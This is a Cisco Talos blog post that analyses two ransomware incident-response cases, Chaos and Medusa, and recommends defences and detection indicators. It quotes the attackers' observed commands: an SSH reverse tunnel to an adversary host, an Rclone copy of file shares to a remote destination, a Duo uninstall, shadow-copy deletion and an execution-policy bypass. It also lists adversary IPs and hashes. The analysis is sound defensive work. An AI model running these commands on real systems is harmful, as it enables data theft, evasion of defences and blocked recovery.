@@ -1,0 +1,751 @@
+
+
+
+Talos IR ransomware engagements and the significance of timeliness in incident response
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Blog
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                Intelligence Center
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Intelligence Center
+
+
+BACK
+
+Intelligence Search
+Email & Spam Trends
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            Vulnerability Research
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Vulnerability Research
+
+
+BACK
+
+Vulnerability Reports
+Microsoft Advisories
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                Incident Response
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Incident Response
+
+
+
+BACK
+
+
+Reactive Services
+
+
+Proactive Services
+
+Emergency Support
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Blog
+
+
+
+
+
+
+
+
+
+Support
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            More
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+                            Security Resources
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Security Resources
+
+
+BACK
+
+
+
+
+Security Resources
+
+
+Open Source Security Tools
+
+
+Intelligence Categories Reference
+
+
+Secure Endpoint Naming Reference
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            Media
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Media
+
+
+BACK
+
+
+
+
+Media
+
+
+Talos Intelligence Blog
+
+
+Threat Source Newsletter
+
+
+Beers with Talos Podcast
+
+
+Talos Takes Podcast
+
+
+Talos Videos
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                            Company
+                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Company
+
+
+BACK
+
+
+
+
+Company
+
+
+About Talos
+
+
+Careers
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Talos IR ransomware engagements and the significance of timeliness in incident response
+
+
+By 
+Aliza Johnson, 
+                James Nutland
+
+
+
+            Wednesday, July 16, 2025 06:00
+        
+
+
+                                Cisco Talos Incident Response
+                            
+
+                                ransomware
+                            
+
+
+
+
+Cisco Talos routinely responds to ransomware engagements where the impact could have been mitigated or wholly prevented if the victim organization had initiated remediation efforts earlier in the attack lifecycle. The significance of early intervention in ransomware attacks is particularly exemplified by two recent Cisco Talos Incident Response (Talos IR) ransomware engagements. In one incident, the victim engaged Talos IR immediately after discovering malicious activity alerts. Talos IR worked swiftly to combat additional malicious activity and prevented the execution of any encryption in the environment. Conversely, in a second incident, the victim ignored alerts of malicious activity and did not contact Talos IR until after the ransomware binary began to execute. Talos IR was then not provided network access for analysis for over a day, during which time the actors achieved nearly 100% host encryption. While there are many factors that can impact the success and severity of a ransomware attack, such as an actor’s sophistication and advanced tooling, close similarities between these two ransomware engagements led us to negate that these variables significantly influenced the disparate outcomes between these two attacks. Introduction As ransomware threat actors continuously decrease their dwell time — here defined as the duration between initial access and encryption — it is increasingly imperative to be mindful of timeliness in incident response engagements (Infosecurity Magazine, CyberScoop, Orca, ThreatDown). Early intervention and remediation can significantly mitigate or even wholly prevent repercussions of ransomware attacks, such as financial loss, reputational damage and legal repercussions, as exemplified by a comparison of two recent Talos IR engagements.In both these cases, the threat actors leveraged similar tools and tactics, techniques and procedures (TTPs) and the victim was alerted to suspicious activity prior to ransomware execution, yet one engagement resulted in 0% network encryption while the other victim experienced nearly 100% encryption.Talos assesses that encryption occurred due to several time delays at pivotal moments. First, Talos was not employed to start an IR engagement until after the ransomware binary was executed, despite early warnings, which allowed the actor to initiate encryption. Then, Talos was provided network access over 30 hours after the engagement began, during which time the actors obtained widespread encryption. For context, according to Talos data, many ransomware variants can seize complete control of a network in just 24-48 hours after initial access. Furthermore, these delays also allowed the threat actor to employ defensive measures that severely limited Talos’ ability to retroactively analyze system logs, a crucial step toward remediating the threat and hardening the network.Description of attack lifecycles  Engagement 1: Data theft without encryption In late April, Chaos ransomware affiliates gained an initial foothold into a victim environment via social engineering. They sent a flood of spam emails to a single user, then contacted the user in Microsoft Teams masquerading as IT support. During the Microsoft Teams session, the adversary guided the user to launch Microsoft Quick Assist and enter their credentials into an unknown login page, which ultimately provided access to the account. That same day, the victim was alerted to the security breach and engaged Talos IR to mitigate the threat, allowing Talos IR to review activity logs before the adversary could completely delete or modify them. The affiliates relied heavily on living-off-the-land binaries (LoLBins) and dual-use tools to conduct post-compromise activity and leveraged Impacket’s “atexec.py” module to execute commands remotely, specifically leveraging the Task Scheduler service. They began exploring the victim’s environment using Windows command line utilities like “ipconfig /all” to list network connections, “nltest /dclist” to list the domain controllers (DCs) within Active Directory (AD) and “quser.exe” to query information about user sessions. We also observed multiple outbound connections to adversary-controlled IP addresses using OpenSSH, an open-source suite of secure networking utilities that provide encrypted communication channels to create a reverse proxy SSH connection.
+
+
+C:\Windows\System32\OpenSSH\ssh.exe -R :12840 -N REDACTED-p 443 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+
+
+To move laterally within the environment, the adversary used Microsoft Remote Desktop and Advanced IP Scanner to obtain access to new accounts and maintained persistence by changing account passwords to lock users out.  Notably, the actors used multiple remote monitoring and management (RMM) applications on different system tiers (e.g., workstations, servers and DCs) to ensure persistent remote access across multiple phases of the operation and to perform slightly different functions: Microsoft Quick Assist socially engineered the victim to install the tool for initial access. AnyDesk was likely the primary method of remote access as it was found on a majority of compromised systems. OptiTune was leveraged to deploy ScreenConnect RMM on a number of hosts. SplashTop was leveraged to enumerate activities on at least one host. They also took precautionary measures to evade detection, like uninstalling Duo from the host:
+
+
+C:\WINDOWS\system32\cmd.EXE, /c, wmic, product, where, name=Duo Authentication for Windows Logon x64, call, uninstall, /nointeractive:
+
+
+A renamed Rclone executable was ran via command line to copy files from a network share:
+
+
+wininit.exe, copy, --max-age, 1y, --exclude, *{psd,7z,mox,pst,FIT,FIL,MOV,mdb,iso,exe,dll,wav,png,db,log,HEIC,dwg,tmp,vhdx,msi}, \\REDACTED\data, REDACTED/data, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 25, --transfers, 15, --b2-disable-checksum, -P
+
+
+Finally, just hours after initial access, the adversary launched the script “backup.sh”, a normal process found on ESXi hosts. Talos IR suspects the adversary leveraged the script to deliver the ransomware executable. We observed attempts to encrypt data on the victim’s VPN that were ultimately unsuccessful.Engagement 2: Nearly 100% encryption In the second engagement, the victim ignored alerts from Cisco’s Managed Detection and Response (MDR) of malicious activity and did not contact Talos IR until after the Medusa ransomware binary began to execute. Then, Talos IR was not provided network access for analysis for over a day, during which time the actors achieved nearly 100% host encryption.A retroactive analysis of the limited logs that remained after encryption revealed the actors similarly relied on dual-use tools. For remote access they used SimpleHelp, a legitimate RMM tool that is commonly abused by ransomware actors and, since January 2025, has been routinely exploited for path traversal (CVE-2024-57727). Talos IR also observed several remote incoming desktop connections from suspicious IP addresses, beacon activity from the commonly abused Brute Ratel C4 (BRC4) red teaming tool, and Windows APIs invoked that could be leveraged for data collection:  Getnativesysteminfo determines the underlying hardware architecture and characteristics of a system, including the type of processor, number of processors and memory page size. Telemetry:api_invoke is the invocation of a Telemetry API. Attackers may monitor or trigger api_invoke events to discover what APIs are available, which users or services call which APIs and which cloud services are used, leveraging corresponding "telemetry:api_invoke" logs for environment enumeration. Bcryptgeneratesymmetrickey generates keys for AES decryption.The adversary established command and control (C2) using JWrapper, a component of SimpleHelp that is often used by IT support and therefore may not be identified as malicious. JWrapper can also be leveraged to stealthily execute files and exfiltrate data, as it is designed to package Java applications into native executable formats for Windows, macOS and Linux. In this attack, the actors used it to execute a file that disabled the User Access Control in the registry by setting the Windows PromptOnSecureDektop record to false:
+
+
+C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access Bundle-00112084494\JWrapperTemp-1745261021-3-app\bin\ windowslauncher.exe  
+\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop
+
+
+JWrapper was also likely used to exfiltrate data:
+
+
+C:\ProgramData\JWrapper-Remote Access\JWrapper-Remote Access Bundle-00112084494\JWrapperTemp-1745261021-3-app\bin\windowslauncher.exe
+
+
+The actors gained unauthorized access to remotely read and modify files within the System32 folder, a critical part of the Windows OS containing essential files needed for the system to function properly, and attempted to delete volume shadow copies from the folder, a common tactic to inhibit data recovery:
+
+
+C:\Windows\System32\vssadmin.exe 'delete' 'shadows' '/shadow={5aa57685-c258-4396-b702-6722ab58e603}
+
+
+They also executed Impacket in the System32 folder via PsExec remote copy and execution:
+
+
+C:\Windows\system32\services.exe, C:\Windows\system32\msiexec.exe /V, C:\Windows\syswow64\MsiExec.exe -Embedding 27A094D718378410D2002AE3023D3731 E Global\MSI0000
+
+
+AnalysisTalos IR assesses that victim response time was the dominant factor that caused the discrepancy in impact. All other factors were incredibly similar, such as the actor’s level of sophistication, the victims’ endpoint security and Talos IR’s response. In both attacks, the affiliates displayed a similar level of sophistication in their tools, heavily using LoLBins and dual-use tools throughout the attack lifecycle. Examples include shared use of Msiexec, WMIC and PowerShell LoLBins and legitimate RMM tools. The actors also both used Impacket to execute commands remotely over SMB or WMI without deploying new payloads and used ADMIN$ administrative shares to propagate malware. A more sophisticated actor may have opted to use a custom malware, similar to the recently discovered Betruger backdoor, which is rarely seen in ransomware attacks.In both cases, the actors also used similarly sophisticated TTPs to obtain widespread network access. They attempted to evade detection and analysis by deleting or modifying files, logs, and tools, and they were able to compromise the victims’ System32 folder and administrative accounts.While Talos IR acknowledges that there are a few minor differences between these two engagements, these would not indicate a significant disparity. For example, the actors used different paid legitimate software to scan IPs and different RMM tools, but this would not have played any significant role in the impact to the victim.We also observed that both victims had a similar flaw in endpoint hygiene by using the outdated PowerShell version 1.0 that was exploited by both threat actors. PowerShell 1.0 lacks several critical security features present in later iterations, making it difficult to detect and analyze malicious activity. For instance, the PowerShell 1.0 execution policy can be easily bypassed using inline execution “powershell.exe -ExecutionPolicy Bypass” or by modifying policy values in memory or the registry. This means scripts can be run without being digitally signed or verified, a common vector for ransomware payloads. Additionally, PowerShell 1.0 does not support Constrained Language Mode (CLM), which in later versions restricts access to .NET classes and APIs that can be exploited for lateral movement or privilege escalation. Without CLM, an attacker gains unrestricted access to the full breadth of PowerShell’s capabilities, including registry manipulation, WMI queries, COM object interaction and raw .NET assembly loading — all of which can be used to establish persistence or elevate privileges.Finally, both victims received notifications of malicious activity prior to ransomware execution and, once the victims chose to engage Talos, we provided the same level of assistance. Timely log analysis enables quick recovery Early engagement with one of the victims and continued communication throughout allowed Talos IR to access the system logs before they could be deleted or modified, which likely helped the victim avoid encryption. Logs are a crucial component of remediating ransomware engagements for many reasons: Identifying weaknesses in network security that the actor exploited so they can be fixed Understanding what data was compromised so the victim can understand the potential fallout and notify the affected customers Establishing a baseline to help easily identify anomalies that indicate suspicious behavior (particularly important considering many ransomware affiliates leverage legitimate tools) Identifying adversary’s routine tools and TTPs to know how to identify future malicious activity, where to place detection systems to prevent future malicious activity and potentially attribute the activity to a particular actor Determining the actor’s goal (e.g., financial theft or espionage) to protect data the actor is likely trying to access Observing a clear path indicating a certain target will be compromised, or viewing failed attempts at a compromise, to preemptively harden the target While Talos IR provided some similar remediation recommendations for each victim due to overlaps in activity, the victim that waited to engage Talos IR received more general recommendations because they had limited logs to review, preventing Talos from understanding the full scope of malicious activity that occurred and how the adversary was able to compromise their network.
+
+ Recommendations based on limited access to logs Tailored recommendations  based on logs Protect against malicious use of RMM software Only allow RMM software that is allowed by the company. All other RMMs should be blocked. Based on malicious SSH remote connection, make sure malicious IPs are blocked. Also consider blocking SSH at the firewall level. Secure passwords Conduct a full password reset for all accounts, including all privileged accounts, service accounts, user accounts and local accounts. Adversaries had access to hosts, which gave them access to the unencrypted data stored in their browsers. To help prevent this vulnerability in the future, implement GPOs to disable users from storing credentials and PII in browsers. Bar the adversary from moving laterally No recommendations provided due to limited visibility Consider migrating to Entra ID instead of the hybrid AD approach as this would have helped prevent the adversary’s lateral movement in the environment. 
+
+Recommendations Raise awareness of phishing and social engineering. Given ransomware actors’ proficiency in using a wide array of techniques to obtain initial access, user education is a key part of spotting phishing attempts, countering MFA bypass techniques and knowing where to report unauthorized access attempts.  Monitor and prevent unnecessary and/or unauthorized use of system administration tools, such as PowerShell, and adhering to zero trust principles. Restrict access to employees who need these for legitimate business purposes. Use of these tools should be logged and audited. Protect logs from modification or deletion. Consider creating service control policies (SCP) for cloud-based resources to prevent users or roles, across the organization, from being able to access specific services or take specific actions within services. For example, the SCP can be used to restrict users from being able to delete logs, update virtual private cloud (VPC) configurations and change log configurations. Additionally, log process execution events and deploy Sysmon to enhance logging capabilities on Windows devices. Restrict the use of RMM and dual-use tools. Review logs for execution of RMM software to detect abnormal use, such as RMM software only being loaded in memory and block both inbound and outbound connections on common RMM ports and protocols at the network perimeter. Employ data loss prevention (DLP) strategies to prevent unauthorized disclosure or leakage. These include data classification policies, data handling policies, user awareness and training and DLP software that can identify and block unauthorized data transfer attempts.Protections   Chaos    Unix.Malware.Chaos-6474834-0   Signature Name: Unix.Malware.Chaos-6474902-0   45975  Medusa   63929, 63928   300998   33058-33060   Signature Name: Andr.Ransomware.Medusa-10033530-0   Signature Name: PUA.Win.Tool.BestCrypt-10033531-0   Signature Name: Win.Ransomware.Medusa_Note-10033532-0Indicators of compromise (IOCs) Chaos    
+
+Filename  SHA256  Status/Description  Wavesor.exe  19ab3c8645d6806ae8a1dad707a86aba344a48d1612aeb5aa145f96ac0e24a03   Malware that can be used to capture critical information  wininit.exe  5540f27f12db5a9e954727079665a282f905a0be787b76d798ca79a318d197f5  Renamed version of rclone  Advanced_IP_Scanner_2.5.4594.1.exe  26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193  IP scanner used for discovery  screensaver.exe  87b3e3462263d7d42dea2bac6c3144181bab22092276f527a94a33af473066d5  ScreenConnect otservice.exe  b5c63f895d27d0572289cb49058ea83b1e49c46a62ca51b4ab44d119111594a4  OptiTune RMM used to deploy ScreenConnect  supportcenter.exe  1ede8d91db625a605535488d1c36a5ea7ba3950194cabe7664ffa7ed6a9aab45  OptiTune RMM  bvscript.exe  9d2fe8a4a229ed2990e33a0330a00c03a415435c3cabd9a42dd882673522bee4  OptiTune RMM Bravura Script Host tool  otpowershell.exe  10a87144386b2869d1bbc40e50f6960d4eb4316d1fd1c1df8708361a7b837b98  OptiTune PowerShell tool  remoteservice.exe  4b6ff966ec6509e86c4a1cbf71d71bf434e08e0aae097a57015ad493db4a3912  OptiTune Remote Service tool  realtimeagent.exe  6a3072a2367329b564c9bf77302a5fbf66673fb471c22fc56a12e901c4d90477  OptiTune Real Time Agent tool  advanced_ip_scanner.exe  4b036cc9930bb42454172f888b8fde1087797fc0c9d31ab546748bd2496bd3e5  IP scanner used for discovery  goodsync.exe  8127614d1906befc82ebc75fc0992e7dbad64ed2233fe316df611bf89ac4df2e  Data exfiltration tool  screenconnect.exe  05016485b683ef6d40bfd805702924909197ee2483a66ffc8a22dc03e4891045  Unknown executable placed on host ‘PKIWEBSVR’.  syncro.installer.exe  845f4d73a0d96898535593c411d924d8c8c3af1dd3ead5f824242bb841d53c8e  Syncro RMM installer  setuputil.exe  1837087e75de428c18acec7f2ef7576752396a3a1ef15450230734e9ee194b28  Splashtop Streamer installer  anydesk.exe   6ccea6a959128112613d7a82c067f8ccc78f05f1f8f47348fc9fecf269f0f21a   Malicious use of AnyDesk  QuickAssist.exe ms-quick-assist   8f67faad634acf0f2971caf8b7ac96e8f05de795b74feec8b82ea168b7be820b  Executable that “patient zero” was socially engineered into running splashtop.exe   03a613c62ae7470e70e0197ea5133625308dc2ac2c5574608d2b6e20c8f94015   Splashtop splashtop_sos.exe   61f281c24846d311031521d13c933c42b33c7283d425456f00cf0ef3ffb04863   Splashtop   
+
+ 
+
+Domain, URI Path, or IP Address  Status/Description  144.172.103[.]42  Adversary controlled IP address used to establish a reverse proxy SSH connection  45.61.134[.]36  Adversary controlled IP address used to establish a reverse proxy SSH connection civicoscolombia[.]com  Domain with malicious reputation and signs of potential data exfiltration  104.21.44[.]57’  IP for malicious domain civicoscolombia[.]com  
+
+Medusa   
+
+Filename  SHA256  Status/Description  windowslauncher.exe   remote access.exe  11e7f8b671ed39497c8561b0ecd13496080681c21a457d6079817a90de553bf1’  SimpleHelp Remote Access Client  storm.exe  ee6d24410a8cf31d672d2a47466b76ad287c7ba016d3711490f0f607b1dc0be3  SimpleHelp Remote Access Client  psexecsvc.exe  cc14df781475ef0f3f2c441d03a622ea67cd86967526f8758ead6f45174db78e  Microsoft Sysinternals PsExec  Remote AccessLauncher.exe  1e43e202a6e5d3059c3901a63fd69b32a7c0719c9f4c4f592a71c85e08e5d188  SimpleHelp Remote Access Client  session_win.exe  6e5f719d4c319e6aab1440f149d8d1dcb512a8f558b62311a0a5d5af366074ff  SimpleHelp Remote Access Client  ipscan-win64-3.0-beta6.exe  8c1ec962a5e01d8717f6391af96c973600797c5285bcac1ac939a8d59e40e64e  Angry IP Scanner  remote access service.exe  dfee42845dd0ba873411df0ea1a917a7f2c1ddd9c024d325ce76aea90a9c9c51    733fc3b203e9b46d1dd8bfdeea3efd2adc569ef6806bdc15b077623670ad52e1    34df37643dab68d3d3b36c415b6b9fd1842c475c088007081ee613a780fd1c2c  SimpleHelp Remote Access Client winpty-agent64.exe  586a2d7d3092b364db3cbb5a7dbc83cf7ef233338c4172c1bae6587f8b374cab  SimpleHelp utility to manage terminal connections                      
+
+ 
+
+Domain, URI Path, or IP Address  Status/Description  213.183.63[.]41  Command and control SimpleHelp remote access IP address  89.36.161[.]17  Command and control SimpleHelp remote access IP address  143.110.243[.]154  Suspected data exfiltration IP address  
+
+
+
+
+Share this post
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Related Content
+
+
+Securing the keys to the kingdom: Announcing Executive Threat Detection
+September 29, 2026 06:00
+This new proactive service joins the suite of retainer offerings to provide dedicated, intelligence-led hunting specifically for your organization’s most high-value IT assets.
+
+
+
+
+[Webinar] Tales from the Frontlines: An exclusive briefing on Q2 incidents
+August 3, 2026 12:00
+Register for an exclusive, unrecorded 30-minute webinar to review the most high-impact incidents Talos IR faced in Q2.
+
+
+
+
+IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
+July 28, 2026 06:00
+Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Intelligence Center
+
+Intelligence Search
+Email & Spam Trends
+
+
+
+
+
+Vulnerability Research
+
+Vulnerability Reports
+Microsoft Advisories
+
+
+
+
+
+Incident Response
+
+
+Reactive Services
+
+
+Proactive Services
+
+
+Emergency Support
+
+
+
+
+
+
+Security Resources
+
+Open Source Security Tools
+Intelligence Categories Reference
+Secure Endpoint Naming Reference
+
+
+
+
+
+Media
+
+Talos Intelligence Blog
+Threat Source Newsletter
+Beers with Talos Podcast
+Talos Takes Podcast
+Talos Videos
+
+
+
+
+
+Support
+
+Support Documentation
+
+
+
+
+
+Company
+
+About Talos
+Careers
+Cisco Security
+
+
+
+
+
+
+
+Follow us
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                ©
+                
+                Cisco Systems, Inc. and/or its affiliates. All rights
+                reserved. View our
+                Privacy Policy.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
